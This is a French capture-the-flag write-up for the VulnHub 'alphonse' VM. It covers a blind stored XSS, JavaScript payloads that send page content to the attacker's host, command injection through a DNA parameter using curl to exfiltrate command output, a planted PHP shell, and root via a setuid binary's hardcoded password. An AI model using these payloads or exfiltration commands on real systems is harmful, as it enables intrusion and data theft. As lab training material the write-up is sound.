# Solution du CTF Alphonse de VulnHub

Le CTF [SP: alphonse](https://vulnhub.com/entry/sp-alphonse-v13,362/) créé par [Daniel Solstad](https://dsolstad.com/) était assez étonnant avec un chemin pour obtenir une exécution de commande assez compliqué puis une escalade de privilèges triviale.

J'ai aussi rencontré quelques difficultés avec la VM qui a tendance à vite manquer d'espace disque en raison des logs qui grossissent rapidement si on fuzze ou brute-force (attention aussi aux fichiers de session PHP dans `/var/lib/php`).

Mon conseil : n'utilisez le brute-force que pour l'énumération web initiale et oubliez le pour la suite. Vous n'en aurez pas besoin pour les URLs découvertes où il s'agit plus de faire quelques essais manuels.

Le CTF fait partie d'une série de challenges nommés après des personnages de *South Park*. Ici le synopsis est le suivant :

> Alphonse is into genes and would like to research your DNA. Is his setup secure thought?

```shellsession
$ sudo nmap -p- -T5 -sCV 192.168.56.74
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 192.168.56.74
Host is up (0.00066s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.56.1
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x    2 ftp      ftp          4096 Sep 05  2019 dev
|_drwxr-xr-x    2 ftp      ftp          4096 Aug 30  2019 pub
80/tcp  open  http        Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: 403 Forbidden
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:85:34:C0 (Oracle VirtualBox virtual NIC)
Service Info: Hosts: 127.0.1.1, ALPHONSE; OS: Unix

Host script results:
|_clock-skew: mean: 1h39m58s, deviation: 2h53m12s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: ALPHONSE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2022-12-07T08:02:34
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: alphonse
|   NetBIOS computer name: ALPHONSE\x00
|   Domain name: \x00
|   FQDN: alphonse
|_  System time: 2022-12-07T03:02:34-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.32 seconds
```

## Nono le petit robot

Sur le serveur FTP se trouve dans le dossier `dev` un fichier avec une extension `apk` :

```shellsession
$ file DNAnalyzer.apk 
DNAnalyzer.apk: Zip archive data, at least v2.0 to extract, compression method=deflate
```

Il s'agit bien sûr d'une application pour Android. On le voit aussi à travers certains fichiers présents dans l'archive.

```
     2344  1979-11-30 00:00   AndroidManifest.xml
  3261688  1979-11-30 00:00   classes.dex
```

Nous allons rétro-ingénierer l'application. Pour cela il faut d'abord extraire le code en utilisant [dex2jar: Tools to work with android .dex and java .class files](https://github.com/pxb1988/dex2jar) :

```shellsession
$ ./d2j-dex2jar.sh classes.dex 
dex2jar classes.dex -> ./classes-dex2jar.jar
```

On peut alors charger le jar dans [JD-GUI](https://java-decompiler.github.io/). Les classes qui nous intéressent sont majoritairement sous le package `com.dnanalyzer.jwt`.

Dans le fichier `NetworkRequest.class` je trouve des références à plusieurs URLs :

```java
  public void doGetProtectedQuote(@NonNull String paramString, @Nullable Callback paramCallback) {
    setCallback(paramCallback);
    doGetRequestWithToken("http://alphonse/dnanalyzer/api/protected/result.php", new HashMap<String, String>(), paramString, paramCallback);
  }
  
  public void doLogin(@NonNull String paramString1, @NonNull String paramString2, Callback paramCallback) {
    setCallback(paramCallback);
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    hashMap.put("username", paramString1);
    hashMap.put("password", paramString2);
    doPostRequest("http://alphonse/dnanalyzer/api/login.php", (Map)hashMap, paramCallback);
  }
  
  public void doSignUp(@NonNull String paramString1, @NonNull String paramString2, String paramString3, @Nullable Callback paramCallback) {
    setCallback(paramCallback);
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    hashMap.put("username", paramString1);
    hashMap.put("password", paramString2);
    hashMap.put("dna_string", paramString3);
    doPostRequest("http://alphonse/dnanalyzer/api/register.php", (Map)hashMap, paramCallback);
  }
```

Et ça tombe bien car l'index servit par le serveur web ne donnait rien d'exploitable (retournait une erreur HTTP 403).

J'ai procédé à une énumération web qui a permis de retrouver les URLs suivantes :

```
301        9l       28w      323c http://192.168.56.74/dnanalyzer/api
200        7l       40w      424c http://192.168.56.74/dnanalyzer/api/register.php
403        5l       26w      270c http://192.168.56.74/dnanalyzer/api/login.php
301        9l       28w      326c http://192.168.56.74/dnanalyzer/portal
200        1l       15w      213c http://192.168.56.74/dnanalyzer/portal/index.php
301        9l       28w      326c http://192.168.56.74/dnanalyzer/vendor
200        0l        0w        0c http://192.168.56.74/dnanalyzer/database.php
```

En revanche le dossier `protected` cité dans le code source ne semble pas exister.

Les scripts de l'API sont suffisemment verbeux pour nous indiquer quoi faire :

```html
<br />
<b>Notice</b>:  Undefined index: username in <b>/var/www/html/dnanalyzer/api/register.php</b> on line <b>22</b><br />
<br />
<b>Notice</b>:  Undefined index: password in <b>/var/www/html/dnanalyzer/api/register.php</b> on line <b>23</b><br />
<br />
<b>Notice</b>:  Undefined index: dna_string in <b>/var/www/html/dnanalyzer/api/register.php</b> on line <b>24</b><br />
{"message":"User was successfully registered."}
```

Je peux ainsi procéder à l'enregistrement :

```shellsession
$ curl -D- http://192.168.56.74/dnanalyzer/api/register.php -XPOST -d "username=devloop&password=devloop&dna_string=1"
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST
Access-Control-Max-Age: 3600
Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With
Content-Length: 47
Content-Type: application/json; charset=UTF-8

{"message":"User was successfully registered."}
```

Et ensuite à la connexion :

```shellsession
$ curl -D- http://192.168.56.74/dnanalyzer/api/login.php -XPOST -d "username=devloop&password=devloop"
HTTP/1.1 200 OK
Server: Apache/2.4.38 (Debian)
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST
Access-Control-Max-Age: 3600
Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With
Content-Length: 338
Content-Type: application/json; charset=UTF-8

{"message":"Successful login.","jwt":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJBbHBob25zZSIsImF1ZCI6IlRIRV9BVURJRU5DRSIsImlhdCI6MTY3MDQwNTMwMiwibmJmIjoxNjcwNDA1MzEyLCJleHAiOjE2NzA0MDUzNjIsImRhdGEiOnsiaWQiOiI0MiIsInVzZXJuYW1lIjoiZGV2bG9vcCJ9fQ.fhJ3uJuM0xyA2sMxk_U4eoySYQMaACO4uD9KROqhuYY","username":"devloop","expireAt":1670405362}
```

J'obtient un token JWT... Je peux le passer à https://jwt-decoder.com/ qui m'indique l'entête suivant :

```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```

et ces données :

```json
{
  "iss": "Alphonse",
  "aud": "THE_AUDIENCE",
  "iat": 1670405302,
  "nbf": 1670405312,
  "exp": 1670405362,
  "data": {
    "id": "42",
    "username": "devloop"
  }
}
```

En fouillant dans le code décompilé j'ai pu faire les correspondances suivantes :

* iss => issuer

* aud => audience

* iat => issueAt

* nbf => notBefore

* exp => expiresAt

* jti => id

* extra => claim

En cherchant un peu sur le web j'ai découvert qu'une grande partie de ces noms de variables sont très génériques (voir [JSON Web Token Claims](https://auth0.com/docs/secure/tokens/json-web-tokens/json-web-token-claims)) et je n'ai d'ailleurs pas trouvé de traitement particulier de ces données dans l'application Android (du genre exécution d'une commande, accès à des fichiers ou autre).

J'ai pensé aussi à une vulnérabilité de désérialisation mais le package *GSON* de Google qui est inclus dans l'application est réputé sûr. Il y a un advisory qui le concerne mais aucun PoC n'est disponible sur Internet.

## Man in the browser

Finalement ma logique a été de me dire que puisque *Alphonse* est intéressé par notre ADN il va forcément  le regarder. Et ça tombe bien quand on s'enregistre on passe un paramètre `dna_string`.

J'ai donc procédé à un enregistrement en spécifiant la valeur suivante :

```html
<script src="http://192.168.56.1/test2.js"></script>
```

Et après quelques minutes j'obtiens effectivement une requête prouvant que le paramètre est vulnérable à un XSS en aveugle.

La suite logique est d'exfiltrer le cookie de l'utilisateur comme j'ai pu le faire sur le CTF [RedCross de HackTheBox](https://github.com/devl00p/blog/blob/main/ctf_writeups/Solution%20du%20CTF%20RedCross%20de%20HackTheBox.md#call-me). Mais ici j'ai obtenu une réponse vide... C'est peut être dû à l'authentification par JWT que l'on a vu plus tôt ou à l'option httpOnly définie sur le cookie.

J'ai décidé de procédé autrement : je provoque une requête HTTP dans le navigateur d'*Alphonse* pour la page qui m'intéresse, j'obtiens la réponse via XHR puis j'envoie le contenu via le chargement d'une image (on ne peut pas le faire directement via XHR en raison de la *same-origin policy*).

Mon script JS devient alors le suivant :

```js
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
    if(xmlhttp.readyState == 4){
        var img = document.createElement("img");
        img.src = "http://192.168.56.1/content" + encodeURI(xmlhttp.responseText);
        document.body.appendChild(img);
    }
}
xmlhttp.open("GET","/dnanalyzer/portal/index.php");
xmlhttp.send();
```

J'obtiens alors une requête sur mon serveur web qui contient la page encodée. Une fois décodée ça ressemble à ceci :

```html
<html>                                                                                                                 
                                                                                                                       
<head>                                                                                                                 
    <meta http-equiv="refresh" content="180">
    <script src="analyze_dna.js"></script>                                                                             
</head>                                                                                                                
                                                                                                                       
<body>                                                                                                                 
    <table border="1">                                                                                                 
        <tr>                                                                                                           
            <td><b>Username</b></td>                                                                                   
            <td><b>DNA string</b></td>                                                                                 
            <td><b>Result</b></td>                                                                                     
            <td><b>Analyze</b></td>                                                                                    
        </tr>                                                                                                          
        <tr>                                                                                                           
            <td>Alphonse</td>                                                                                          
            <td id="dna_string_id_5">GATC</span>                                                                       
            </td>                                                                                                      
            <td id="dna_res_id_5">Superb</td>                                                                          
            <td><button id="5" onclick="edit_dna(this);">Analyze</button></td>                                         
        </tr>                                                                                                          
        <tr>                                                                                                           
            <td>Kevin</td>                                                                                             
            <td id="dna_string_id_6">TCAG</span>                                                                       
            </td>                                                                                                      
            <td id="dna_res_id_6">Weak</td>                                                                            
            <td><button id="6" onclick="edit_dna(this);">Analyze</button></td>                                         
        </tr>                                                                                                          
--- snip ---
        <tr>                                                                                                           
            <td>devloop</td>                                                                                           
            <td id="dna_string_id_42">1</span>                                                                         
            </td>                                                                                                      
            <td id="dna_res_id_42"></td>                                                                               
            <td><button id="42" onclick="edit_dna(this);">Analyze</button></td>                                        
        </tr>                                                                                                          
        <tr>                                                                                                           
            <td>zozo</td>                                                                                             
            <td id="dna_string_id_1009">                                                                               
                <script src="http://192.168.56.1/test2.js"></script>                                                   
                </span>                                                                                                
            </td>                                                                                                      
            <td id="dna_res_id_1009"></td>                                                                             
            <td><button id="1009" onclick="edit_dna(this);">Analyze</button></td>                                      
        </tr>                                                                                                          
    </table><br />                                                                                                     
    <form action="" method="POST"><input name="logout" type="submit" value="Logout" /></form>                          
</body>                                                                                                                
                                                                                                                       
</html>
```

C'est la page sur laquelle notre injection a lieu (on voit d'ailleurs mon code). Je procéde à la même étape mais pour le fichier JS qui est utilisé.

Le contenu dumpé est le suivant :

```js
function edit_dna(elem) {
    var id = elem.id;
    var val = document.getElementById('dna_string_id_' + id).innerHTML;
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "analyze_dna.php");
    xhr.setRequestHeader('Content-type', 'application/json');
    xhr.onreadystatechange = function() {
        if (xhr.readyState == 4 && xhr.status == 200) {
            document.getElementById('dna_res_id_' + id).innerHTML = xhr.responseText;
        }
    }
    xhr.send(JSON.stringify({"id":id,"val":val}));
}
```

Donc la logique de l'analyse ADN est faite par le script PHP `analyze_dna.php`.

J'ai essayé de communiquer avec lui via `curl` mais impossible d'obtenir le moindre résultat même en passant mon token JWT.

L'authentification qui a lieu sous le dossier `/portal` doit être différente ou n'accepter que le compte de *Alphonse*.

Par conséquent je n'ai pas trop le choix, je vais forger la requête vers le script PHP en passant par son navigateur. J'ai noté que *Alphonse* avait marqué son ADN comme étant *Superb* (le prétentieux). Voyons voir si j'envoie la même chaine ADN mais avec mon identifiant 42 :

```js
var xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = function () {
    if(xmlhttp.readyState == 4){
        var img = document.createElement("img");
        img.src = "http://192.168.56.1/dna" + encodeURI(xmlhttp.responseText);
        document.body.appendChild(img);
    }
}
xmlhttp.open("POST","/dnanalyzer/portal/analyze_dna.php");
xmlhttp.setRequestHeader('Content-type', 'application/json');
xmlhttp.send(JSON.stringify({"id": 42, "val": "GATC"}));
```

Dans le contenu leaké j'obtiens effectivement le status *Superb*. Il faut donc que je continue à utiliser cette session authentifiée.

## ADN piégé

A ce stade j'ai déja passé beaucoup de temps sur le CTF (surtout parce que le XSS est déclenché toutes les 3 minutes seulement) et je n'ai pas trop envie d'imaginer qu'il faille enchainer sur une faille SQL. Il me semblait relativement probable qu'on aurait directement un RCE.

J'ai donc passé la valeur suivante :

```js
xmlhttp.send(JSON.stringify({"id": 42, "val": "GATC;curl http://192.168.56.1/success;"}));
```

Et la VM a bien tapé sur mon URL. On voit aussi la réponse de mon serveur qui est renvoyée ensuite sur le mien via le chargement de l'image :

```
[Mon Dec 12 19:47:00 2022] 192.168.56.74:52448 Accepted
[Mon Dec 12 19:47:00 2022] 192.168.56.74:52448 [404]: (null) /success - No such file or directory
[Mon Dec 12 19:47:00 2022] 192.168.56.74:52448 Closing
[Mon Dec 12 19:47:00 2022] 192.168.56.74:52450 Accepted
[Mon Dec 12 19:47:00 2022] 192.168.56.74:52450 [404]: (null) /dna%3C/head%3E%3Cbody%3E%3Ch1%3ENot%20Found%3C/h1%3E%3Cp%3EThe%20requested%20resource%20%3Ccode%20class=%22url%22%3E/success%3C/code%3E%20was%20not%20found%20on%20this%20server.%3C/p%3E%3C/body%3E%3C/html%3E - No such file or directory
[Mon Dec 12 19:47:00 2022] 192.168.56.74:52450 Closing
```

J'ai tenté quelques commandes de reverse-shell mais une bonne partie ont échouées. Je me suis renseigné un peu sur la machine avec ce type de commande pour exfiltrer les informations :

```bash
curl http://192.168.56.1/`uname -a|base64 -w0`
```

On a bien un système 64 bits :

`Linux alphonse 4.19.0-5-amd64 #1 SMP Debian 4.19.37-5+deb10u2 (2019-08-08) x86_64 GNU/Linux`

Et concernant nos droits sur le serveur :

```bash
curl http://192.168.56.1/`(id; ls -al)|base64 -w0`;
```

Youpi, le dossier parent (`dnanalyze`) est world-writable :

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
total 40
drwxr-xr-x 2 alphonse alphonse  4096 Sep  1  2019 .
drwxrwxrwx 5 alphonse alphonse  4096 Dec  7 08:18 ..
-rw-r--r-- 1 alphonse alphonse   511 Aug 30  2019 analyze_dna.js
-rw-r--r-- 1 alphonse alphonse   632 Sep  1  2019 analyze_dna.php
-rwxr-xr-x 1 alphonse alphonse 16664 Aug 30  2019 dnanalyzer
-rw-r--r-- 1 alphonse alphonse  2083 Sep  1  2019 index.php
```

Une fois uploadé un shell PHP dedans (via `curl -o`) puis un *reverse-ssh* plus tard je peux fouiller un peu plus.

Voici le contenu du script `analyze_dna.php` :

```php
<?php

ini_set('display_errors', true);
error_reporting(E_ALL);

session_start();

if (isset($_SESSION['authed'])) {
    $data = json_decode(file_get_contents("php://input"));
    if (!$data) {
        exit();
    }
    $val = $data->val;
    $id = $data->id;

    $res = exec('./dnanalyzer ' . $val);

    include_once '../database.php';

    $databaseService = new DatabaseService();
    $con = $databaseService->getConnection();

    try {
        $con->query("UPDATE `Users` SET dna_result = '" . $res . "' WHERE id = '" . $id . "'");
    } catch (PDOException $e) {
        print $e->getMessage();
    }

    print $res;

}

?>
```

Tout est stocké dans une base sqlite3 :

```shellsession
www-data@alphonse:/var/www/html/dnanalyzer$ sqlite3 users.sqlite3 
SQLite version 3.27.2 2019-02-25 16:06:06
Enter ".help" for usage hints.
sqlite> .tables
Users
sqlite> .schema Users 
CREATE TABLE Users (id INTEGER PRIMARY KEY AUTOINCREMENT, username nvarchar, password nvarchar, dna_string nvarchar, dna_result nvarchar);
sqlite> select * from Users;
5|Alphonse|$2y$10$R6Y.DdYH5BUhbtUf1LOQ1OxAAxlRlrUbXg0z.tZtXnQxML7BiFN4e|GATC|Superb
6|Kevin|$2y$10$qqh98ui/i.DOW5pDCXRJJedNnYOwk8TttCEc5TQB35q.8N.4U8jfO|TCAG|Weak
40||$2y$10$ph0nscggdbMy82KLyxfv1.szMoWpSl3m7usR166TKfcB4sW56FfWm||
41||$2y$10$mPKMdYV77kglkqFfdbGhYe5817Jk3gDQiNDG/jsx9LM7FpSXKXJuC||
42|devloop|$2y$10$CpVpMf..X7EGn941Y2MGcexFKeATqOgMxOn5rtur36pWdERq0RmVG|1|Superb
43|zozo2|$2y$10$cA1pP8gSFcq9WU5XevCMjOzK1q9PEG1Mv6BaKZGD26dver24L5Ozi|<script src="http://192.168.56.1/test2.js"></script>|
```

J'ai tenté de donner ces hashs à *JohnTheRipper* mais ils semblent trop forts pour être cassés.

J'ai trouvé différents fichiers dans le dossier personnel de `Alphonse` :

```
-rw-r--r--  1 alphonse alphonse   12 Sep  1  2019 flag.txt
-rwxr-xr-x  1 alphonse alphonse   21 Sep 10  2019 lock.sh
-rw-r--r--  1 alphonse alphonse   65 Aug 30  2019 todo.txt
```

On a visiblement affaire à un scientifique fou ([Timsit avait raison](https://www.youtube.com/watch?v=mHl--iqe4xw)) :

```
* Create monkey with four asses
* Create monkey with seven asses
```

On obtient aussi notre premier flag : `dmx2urv87f2`

Le script `lock.sh` s'assure uniquement que la session graphique de l'utilisateur se vérouille :

```bash
sleep 1
dm-tool lock
```

Dans le dossier `Documents` de l'utilisateur je trouve un binaire setuid root :

```
-rwsr-xr-x  1 root     root      17K Sep  3  2019 rootme
```

Un petit hexdump s'impose :

```
00002000  01 00 02 00 2e 2f 72 6f  6f 74 6d 65 20 3c 70 61  |...../rootme <pa|
00002010  73 73 77 6f 72 64 3e 00  61 4e 68 67 4b 69 34 78  |ssword>.aNhgKi4x|
00002020  75 4f 00 48 65 72 65 20  79 6f 75 20 67 6f 3a 00  |uO.Here you go:.|
00002030  62 61 73 68 00 2f 62 69  6e 2f 73 68 00 57 72 6f  |bash./bin/sh.Wro|
00002040  6e 67 20 70 61 73 73 77  6f 72 64 00 01 1b 03 3b  |ng password....;|
```

Comme dis au début de l'article c'est trivial :

```shellsession
www-data@alphonse:/home/alphonse/Documents$ ./rootme aNhgKi4xuO
Here you go:
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls
flag.txt
# cat flag.txt
91bmZfpe2L
```

## Sous le capot

Il y a un Firefox (un vrai, pas un headless) qui est lancé à l'ouverture de session de l'utilisateur et qui se charge d'ouvrir un fichier HTML sur le disque :

```shellsession
www-data@alphonse:/home/alphonse$ cat .config/autostart/Firefox.desktop 
[Desktop Entry]
Encoding=UTF-8
Version=0.9.4
Type=Application
Name=Firefox
Comment=
Exec=/usr/bin/firefox "file:///var/scripts/index.html"
OnlyShowIn=XFCE;
StartupNotify=false
Terminal=false
Hidden=false
```

Ca explique pourquoi un script bash s'occupait de vérouiller la session. Le système devait être configuré pour connecter *Alphonse* sans saisie de mot de passe mais laisser assez de temps pour que *Firefox* se lance.

Le fichier HTML chargé est le suivant :

```html
<body onload="document.form1.submit();">
<form name="form1" action="http://127.0.0.1/dnanalyzer/portal/index.php" method="POST">
<input name="user" type="text" value="alphonse"/>
<input name="pass" type="text" value="YouCantBruteforceThisIn10000years%"/>
<input name="login" type="text" value="login" />
</form>
</body>
```

Il procéde seulement à l'authentification sur l'interface portal.

Pour terminer on pouvait lire plus tôt que la page qui affiche les résultats ADNs avait un tag méta qui rechargait la page toutes les 3 minutes :

```html
<meta http-equiv="refresh" content="180">
```

Comme quoi il ne faut pas bourriner sur le formulaire d'enregistrement sans quoi le code HTML risque de se retrouver dans un état impraticable.

L'auteur du CTF a publié une solution dans laquelle il utilise [mygg.js: Proxy via XSS](https://github.com/dsolstad/mygg.js) qui n'est pas éloigné du framework BeEF :

[DANIEL SOLSTAD - Walkthrough of Alphonse](https://dsolstad.com/vm/2020/09/30/Walkthrough-VulnHub-Alphonse.html)

*Publié le 13 décembre 2022*